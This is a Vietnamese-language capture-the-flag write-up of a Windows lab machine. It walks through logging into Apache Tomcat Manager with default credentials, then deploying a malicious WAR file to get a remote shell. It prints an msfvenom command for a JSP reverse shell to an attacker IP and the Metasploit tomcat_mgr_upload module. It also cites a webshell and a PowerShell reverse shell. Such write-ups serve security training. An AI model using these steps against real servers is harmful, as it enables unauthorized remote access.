# Jerry-windows

![https://lh7-us.googleusercontent.com/7LE21w0AJDj1CMdz-yvAlbG2iCLKTMsf_tm_gjjDG9HTXjKsz8uY9tdCbaBmygQoSG0P7kuTvwMt1ZPtuNFqXTM61YHvSfrTBiELItDqRD2d7yVafebKQqmA58nwRxFWLvYJLfr4dsHW](https://lh7-us.googleusercontent.com/7LE21w0AJDj1CMdz-yvAlbG2iCLKTMsf_tm_gjjDG9HTXjKsz8uY9tdCbaBmygQoSG0P7kuTvwMt1ZPtuNFqXTM61YHvSfrTBiELItDqRD2d7yVafebKQqmA58nwRxFWLvYJLfr4dsHW)

![https://lh7-us.googleusercontent.com/7FQKGzpaziKSVuu9F52PWIpwtBTE6x3HUSCgrx2mAgtyI1qzvZtGc2L60brnxvLqWSmnpt7iOlUsuR0mA7sK1Sgd2njmkjs7OHfD8TRNavMr-PRoFrTSfBR5tmmCdE_4ZCPlGl-DJILf](https://lh7-us.googleusercontent.com/7FQKGzpaziKSVuu9F52PWIpwtBTE6x3HUSCgrx2mAgtyI1qzvZtGc2L60brnxvLqWSmnpt7iOlUsuR0mA7sK1Sgd2njmkjs7OHfD8TRNavMr-PRoFrTSfBR5tmmCdE_4ZCPlGl-DJILf)

![https://lh7-us.googleusercontent.com/80XFlrOQ8nb1pcBBgC3QydwHpljgWUvLbF0tYcpGqhyr9ghsjIs0VLqBX_ibWEpM56x5QuRrxVL3Z56JZR3kKvm07Cykq4QNUiYSIHhSx-NEHp34o5e_X_oQTSNaLg3L--iWqmP9nRz0](https://lh7-us.googleusercontent.com/80XFlrOQ8nb1pcBBgC3QydwHpljgWUvLbF0tYcpGqhyr9ghsjIs0VLqBX_ibWEpM56x5QuRrxVL3Z56JZR3kKvm07Cykq4QNUiYSIHhSx-NEHp34o5e_X_oQTSNaLg3L--iWqmP9nRz0)

Manager App sounds interesting!

cần đăng nhập

thử admin:admin -> don’t work nhưng lỗi có thông tin đăng nhập

![https://lh7-us.googleusercontent.com/avARg8phAxkvi_DQ7rzuD-j91SyRsaite3JeICo2big14esCNw8mBrl-DFpcpD12mg4h5TB9JiEbWcqbTVZYE5rduG72l1s8-DN01Gxrr8Wl_rjOZzLgbkJL3CXyN4K8-AqFodCQhmPK](https://lh7-us.googleusercontent.com/avARg8phAxkvi_DQ7rzuD-j91SyRsaite3JeICo2big14esCNw8mBrl-DFpcpD12mg4h5TB9JiEbWcqbTVZYE5rduG72l1s8-DN01Gxrr8Wl_rjOZzLgbkJL3CXyN4K8-AqFodCQhmPK)

tomcat:s3cret

Một số tên trong số này trông không chuẩn, cho thấy rằng đây có thể là cách có thể có được quyền truy cập của người dùng.

![https://lh7-us.googleusercontent.com/FJ9PMBJQsgfDnUqIw7oWR_XhCUG5LBBpE-r11MXDc2kkFv6h-e-AVru41xiDz3yztELLY7wnwEOBFNYZCU6uAGwvBj5j_Y0KixnvBUtk0EuTN4MTpKbV4ygaE-e2H6xU7FanVncp7uhz](https://lh7-us.googleusercontent.com/FJ9PMBJQsgfDnUqIw7oWR_XhCUG5LBBpE-r11MXDc2kkFv6h-e-AVru41xiDz3yztELLY7wnwEOBFNYZCU6uAGwvBj5j_Y0KixnvBUtk0EuTN4MTpKbV4ygaE-e2H6xU7FanVncp7uhz)

mục deploy: có thể upload file [How to Hack Apache Tomcat via Malicious WAR File Upload « Null Byte :: WonderHowTo](https://null-byte.wonderhowto.com/how-to/hack-apache-tomcat-via-malicious-war-file-upload-0202593/)

![https://lh7-us.googleusercontent.com/S72w2fpuU78rAC64qcNNMKbNTUMYQtGS3_HNcQIF-iJRm1Y26wsCuiczby_AoUD76SCb3COWPh_kUDvwsMq73rDQ8od6-Y6-bzbV-GMqQAIszULJXRHw6LPPxS0DNtvlYU5ivFxA4uLa](https://lh7-us.googleusercontent.com/S72w2fpuU78rAC64qcNNMKbNTUMYQtGS3_HNcQIF-iJRm1Y26wsCuiczby_AoUD76SCb3COWPh_kUDvwsMq73rDQ8od6-Y6-bzbV-GMqQAIszULJXRHw6LPPxS0DNtvlYU5ivFxA4uLa)

Tệp WAR (web archive ~ lưu trữ web)có thể được ký điện tử giống như tệp JAR để cho phép người khác xác định mã nguồn đến từ đâu.

**c1:** sử dụng msfvenom tạo file war để tạo reverse shell

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.21 LPORT=1234 -f war > shell.war

![https://lh7-us.googleusercontent.com/059Ep1J8JU8Gxr1m53J9S3jHOrMLwq1EQOFo2roJIn7uqXGD7iUWGAELB75bO5tJpiH3cSvg2w-dtlSa8d7tO0LoFXeHcfJifk27XEvj-ukzK3SGbbJpiE4uymVxAfCDgQv4q_CgWy4e](https://lh7-us.googleusercontent.com/059Ep1J8JU8Gxr1m53J9S3jHOrMLwq1EQOFo2roJIn7uqXGD7iUWGAELB75bO5tJpiH3cSvg2w-dtlSa8d7tO0LoFXeHcfJifk27XEvj-ukzK3SGbbJpiE4uymVxAfCDgQv4q_CgWy4e)

WAR file (Web Application Resource or Web application ARchive) là tệp được sử dụng để phân phối tập hợp các tệp JAR, Trang JavaServer, Java Servlet, các lớp Java, tệp XML, thư viện thẻ, trang web tĩnh và các tài nguyên khác cùng tạo thành một ứng dụng web.

netcat với port đã set ở lệnh trên và upload file shell.war lên deploy

upload file thành công

![https://lh7-us.googleusercontent.com/2ox2Uo6RiZ2dPXBJrZsjjL_6ys-Ceb0JVxSfFCh3rC_eETNnZm-98O4USi_G-4V6JnzJdhhQfXlTZhTlc-ZY1tRTpA6IY3ROIetXDsjnHh8AqcqLhqSGEVKVjhSqCNry5E5pOjwKBa23](https://lh7-us.googleusercontent.com/2ox2Uo6RiZ2dPXBJrZsjjL_6ys-Ceb0JVxSfFCh3rC_eETNnZm-98O4USi_G-4V6JnzJdhhQfXlTZhTlc-ZY1tRTpA6IY3ROIetXDsjnHh8AqcqLhqSGEVKVjhSqCNry5E5pOjwKBa23)

truy cập path giống tên file .war

![https://lh7-us.googleusercontent.com/MKxLsVKihssxH2iKvpvWuzkcsrKP-oQ707mnyFj885AcX7LouakXDUwkB9iKNmYyjSicqElQ5UU_nlPr94lHokq03w1zABMRmeKm5ltreOUKisoXu7AUPRd4dlx-W46cssbwYx05HMVd](https://lh7-us.googleusercontent.com/MKxLsVKihssxH2iKvpvWuzkcsrKP-oQ707mnyFj885AcX7LouakXDUwkB9iKNmYyjSicqElQ5UU_nlPr94lHokq03w1zABMRmeKm5ltreOUKisoXu7AUPRd4dlx-W46cssbwYx05HMVd)

có được shell windows

![https://lh7-us.googleusercontent.com/4FBceWDYCOWrNjnvBDyv4tqEbiYdOGXvpUndp-EfLY-IkHo6r05GC8ykewc36gZsziab4qv2enddz4zCszIWmS3nFlDEMMJs1LJH90ZZcTfGKeDQx5_qBr-6VZ5AX9dok7nCnFdmQJXU](https://lh7-us.googleusercontent.com/4FBceWDYCOWrNjnvBDyv4tqEbiYdOGXvpUndp-EfLY-IkHo6r05GC8ykewc36gZsziab4qv2enddz4zCszIWmS3nFlDEMMJs1LJH90ZZcTfGKeDQx5_qBr-6VZ5AX9dok7nCnFdmQJXU)

**c1:** sử dụng msfconsole

Lưu ý: sử dụng module multi/http/tomcat_mgr_upload sử dụng POST tới /manager/html/upload để get payload trên máy chủ, có một module tương tự khác là multi/http/Tomcat_mgr_deploy sử dụng PUT để tải payload lên, từ việc thử nghiệm payload deploy limit success, vì vậy nên sử dụng payload upload.

use multi/http/tomcat_mgr_upload

![https://lh7-us.googleusercontent.com/uS3kmtP-ux-cf3IaEM3ID_QPRnUljHb_UG3NI4M6yEXANsuv__EFRaXkPN4gyxVaqiTdrV833ynkE6nfwBViBC6wQIeHOdyHyJ-tJg41vYyxfelzWnkxlQU4R_ONSjCP-LGom0nV34d0](https://lh7-us.googleusercontent.com/uS3kmtP-ux-cf3IaEM3ID_QPRnUljHb_UG3NI4M6yEXANsuv__EFRaXkPN4gyxVaqiTdrV833ynkE6nfwBViBC6wQIeHOdyHyJ-tJg41vYyxfelzWnkxlQU4R_ONSjCP-LGom0nV34d0)

![https://lh7-us.googleusercontent.com/hx1Y11EyYRQuo3yUbAvbbAYUtZws-LhQAlhZr-kJZYORGWw6xP1v_WRx7AcauPoCZDOHXUhRVbAt1z3ETDlWXZt8-0G5eOiDZ7leiBja-3unlIquUM5IER7OU-duqfwDtFtHAocTJLyM](https://lh7-us.googleusercontent.com/hx1Y11EyYRQuo3yUbAvbbAYUtZws-LhQAlhZr-kJZYORGWw6xP1v_WRx7AcauPoCZDOHXUhRVbAt1z3ETDlWXZt8-0G5eOiDZ7leiBja-3unlIquUM5IER7OU-duqfwDtFtHAocTJLyM)

![https://lh7-us.googleusercontent.com/WB5znBDC0USBrgAZsXISNdc2heSNhHtsvKZqALCQdw90kHMAI-5aMnQgkp3xn7awkGBlPATkb3JtXVwppyfKpibtUvXjlw8yf2tJq_chgujxYlGEGoHig98udwO7WH-jjq5GLMYfQtOo](https://lh7-us.googleusercontent.com/WB5znBDC0USBrgAZsXISNdc2heSNhHtsvKZqALCQdw90kHMAI-5aMnQgkp3xn7awkGBlPATkb3JtXVwppyfKpibtUvXjlw8yf2tJq_chgujxYlGEGoHig98udwO7WH-jjq5GLMYfQtOo)

![https://lh7-us.googleusercontent.com/5J7ZBJS_4NJyFIbmY6qldFQRnqrXMBM3KtaHFN3FwCft1PC-6z4aSiVu--mdUqE7buGNDkwWMKfO6js4Mh0Bo0NGyfCGl3KwdxD5Fj4ilbsS1YWHKCxQCId26e4P3SrzyJW9l0zl_S2s](https://lh7-us.googleusercontent.com/5J7ZBJS_4NJyFIbmY6qldFQRnqrXMBM3KtaHFN3FwCft1PC-6z4aSiVu--mdUqE7buGNDkwWMKfO6js4Mh0Bo0NGyfCGl3KwdxD5Fj4ilbsS1YWHKCxQCId26e4P3SrzyJW9l0zl_S2s)

-> có đc shell meterpreter>shell -> có được shell của windows

![https://lh7-us.googleusercontent.com/9f_Rk4uQyIZnm6_d5rwxQxeN-wuANxIizQhLgv9wjC5fEUwG1rjns4M-JCjE6KeuFcYwBoQNCS_C3Fsi1PLhh5sznHvSiyMNrEvsNb7xiSa3j8ya2P0Fee6xBmHobSjm_H0mA4Wd1iK1](https://lh7-us.googleusercontent.com/9f_Rk4uQyIZnm6_d5rwxQxeN-wuANxIizQhLgv9wjC5fEUwG1rjns4M-JCjE6KeuFcYwBoQNCS_C3Fsi1PLhh5sznHvSiyMNrEvsNb7xiSa3j8ya2P0Fee6xBmHobSjm_H0mA4Wd1iK1)

![https://lh7-us.googleusercontent.com/PjfwKc0nkRRhp-AcgnTWIMDYw0tdntnQKS36OlGkeEftw3Xz8cWuIexNJQ-FRovrD-Lz2yyH_mDihLXEU3AFUgkE3uOCHSUJrQKACgUWl6QhMtOLavt6JEz9hJEyl2eH3XO6I6DIb_dF](https://lh7-us.googleusercontent.com/PjfwKc0nkRRhp-AcgnTWIMDYw0tdntnQKS36OlGkeEftw3Xz8cWuIexNJQ-FRovrD-Lz2yyH_mDihLXEU3AFUgkE3uOCHSUJrQKACgUWl6QhMtOLavt6JEz9hJEyl2eH3XO6I6DIb_dF)

mục đích sử dụng shell để phần nhắc lệnh dễ biết vị trí thư mục

![https://lh7-us.googleusercontent.com/akx3lPY8GvK1HHfOkFURrGoVja7-vPoOEa8oZD4TdT4I4YOfJJlITndEmrDWI-386AI27W8Lfn1LmKJDt6McaVl655ZVQK18Sr3kNH9oQXUxgfPIlnx8OD6I9rk0waUHPwFaCAduqDUi](https://lh7-us.googleusercontent.com/akx3lPY8GvK1HHfOkFURrGoVja7-vPoOEa8oZD4TdT4I4YOfJJlITndEmrDWI-386AI27W8Lfn1LmKJDt6McaVl655ZVQK18Sr3kNH9oQXUxgfPIlnx8OD6I9rk0waUHPwFaCAduqDUi)

**c2:** download .war from github

[p0dalirius/Tomcat-webshell-application: A webshell application and interactive shell for pentesting Apache Tomcat servers. (github.com)](https://github.com/p0dalirius/Tomcat-webshell-application/tree/master)

unzip > trong  thư mục 9lower có file .war

upload lên phần deploy -> giao diện có xuất hiện path /webshell (tên giống file .war)

![https://lh7-us.googleusercontent.com/gPZW82995e3Aj6xfDLNLexQQPnz4XKGuDKq9W1g6aCVKpo7TUFile9Rpk5rRpY87MFvCk3-d9h-JZ4pyJuXFsE-eiZsgAuUj2JL2ZO1ti3AKWn3IQiNXRzdHxd_H1leATJrftNLPpLeI](https://lh7-us.googleusercontent.com/gPZW82995e3Aj6xfDLNLexQQPnz4XKGuDKq9W1g6aCVKpo7TUFile9Rpk5rRpY87MFvCk3-d9h-JZ4pyJuXFsE-eiZsgAuUj2JL2ZO1ti3AKWn3IQiNXRzdHxd_H1leATJrftNLPpLeI)

truy cập và thực thi lệnh

![https://lh7-us.googleusercontent.com/5KIdA30aryOcOZA1APW9pd9jSHpi-cUrV1S-o5dIfWW0dZVfixCtnXG0uj7oien-5fv4ZAt3pcQvs1yN1qdqdreUQtk2bnl2kcwyxFU2UlfOaZJCewwRPnyWoYAhsGw6fjGvxIR8gM3w](https://lh7-us.googleusercontent.com/5KIdA30aryOcOZA1APW9pd9jSHpi-cUrV1S-o5dIfWW0dZVfixCtnXG0uj7oien-5fv4ZAt3pcQvs1yN1qdqdreUQtk2bnl2kcwyxFU2UlfOaZJCewwRPnyWoYAhsGw6fjGvxIR8gM3w)

![https://lh7-us.googleusercontent.com/6o3F-ubSJGmCw5jqZH7YPOsSZsH8rwsMONqg3QD9ihV2XniMoNnHgI8C-JSE001MNM8LZjlpn_MbGc514NZQ34nedpnFEvrFWl9-jYd6C3sztKzzyu5wleeaCRWtEQ1qBsyz80n97Rr4](https://lh7-us.googleusercontent.com/6o3F-ubSJGmCw5jqZH7YPOsSZsH8rwsMONqg3QD9ihV2XniMoNnHgI8C-JSE001MNM8LZjlpn_MbGc514NZQ34nedpnFEvrFWl9-jYd6C3sztKzzyu5wleeaCRWtEQ1qBsyz80n97Rr4)

lệnh được sử dụng thuộc format lệnh trên windows nên khó thực thi và kết quả khó đọc

**c2.1:** tạo reverse shell sử dụng nishang: [PowerShell for Pentester: Windows Reverse Shell - Hacking Articles](https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/)

download .ps1

tạo http.server

netcat

gửi request tạo shell

![https://lh7-us.googleusercontent.com/_hUikR65DrP8kKYhttrjK4fh5kT8UiaTWUmv5lCwBtzICq4G0ER2lTk-e5LnZKDCpZC31y9fTTx96p2pJAWguqhMeo3FTvsa7ahmSNYKjnO9LV-UzTgIga2UWmVHNI9RYDlqWFx1mN3T](https://lh7-us.googleusercontent.com/_hUikR65DrP8kKYhttrjK4fh5kT8UiaTWUmv5lCwBtzICq4G0ER2lTk-e5LnZKDCpZC31y9fTTx96p2pJAWguqhMeo3FTvsa7ahmSNYKjnO9LV-UzTgIga2UWmVHNI9RYDlqWFx1mN3T)

có được shell windows

![https://lh7-us.googleusercontent.com/mNwD5tOehE6zFOhfmkFekd83bIz6MnZP-Ufvs5OjcGb4RaVOjXSvxYK3t6L0Fp87H-cgNCJ1q4IEnlfd-xguyTjGZbHvplWud2OjK0F7tqJ3xZ3cUzmzkG_lVOnE7HSqZYJc24LxLRn7](https://lh7-us.googleusercontent.com/mNwD5tOehE6zFOhfmkFekd83bIz6MnZP-Ufvs5OjcGb4RaVOjXSvxYK3t6L0Fp87H-cgNCJ1q4IEnlfd-xguyTjGZbHvplWud2OjK0F7tqJ3xZ3cUzmzkG_lVOnE7HSqZYJc24LxLRn7)

**c2.2:** sử dụng file .py để có interactive console

![https://lh7-us.googleusercontent.com/MkAkTwr10JirjcHb49tUfsIVYMmjEr1FkhRXHNRHldTU4YPaGiuf2zK5EcgckeQoiJQs95GHBSl5nig4d12TOH04ZAHUlWyRqWFDaRtbjA38t6FBzYxTUg95Y4egHyBVXEj5jgzd9mQk](https://lh7-us.googleusercontent.com/MkAkTwr10JirjcHb49tUfsIVYMmjEr1FkhRXHNRHldTU4YPaGiuf2zK5EcgckeQoiJQs95GHBSl5nig4d12TOH04ZAHUlWyRqWFDaRtbjA38t6FBzYxTUg95Y4egHyBVXEj5jgzd9mQk)

![https://lh7-us.googleusercontent.com/tCU1sOfBvH5Sf1lbD9m__-DhC6HwJg7BS0tx4SYAoCxccgIGxcsp1yqN8yCfLSX_vkKTj5b8jklC0QALcudU-9B9aQSmB3cMxAMuLqnyYao5KcA5gDtXIIqNR6be3WOZcMJz6eUC7Q_E](https://lh7-us.googleusercontent.com/tCU1sOfBvH5Sf1lbD9m__-DhC6HwJg7BS0tx4SYAoCxccgIGxcsp1yqN8yCfLSX_vkKTj5b8jklC0QALcudU-9B9aQSmB3cMxAMuLqnyYao5KcA5gDtXIIqNR6be3WOZcMJz6eUC7Q_E)